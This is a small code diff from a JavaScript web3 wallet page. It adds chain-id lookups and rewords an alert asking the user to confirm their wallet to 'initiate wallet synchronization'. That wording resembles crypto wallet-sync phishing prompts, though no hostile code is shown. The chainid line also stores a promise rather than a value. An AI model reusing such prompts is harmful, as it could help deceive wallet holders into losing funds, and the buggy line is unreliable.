@@ -170,7 +170,9 @@ async function fetchAccountData() {
   document.getElementById("ether").style.display = "";
   document.getElementById("matic").style.display = "";
   document.getElementById("bsc").style.display = "";
-  alert("You are the Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  web3.eth.net.getId().then(console.log);
+ var chainid =web3.eth.net.getId();
+  alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
   document.querySelector("#prepare").style.display = "none";
   document.querySelector("#connected").style.display = "block"; 
  
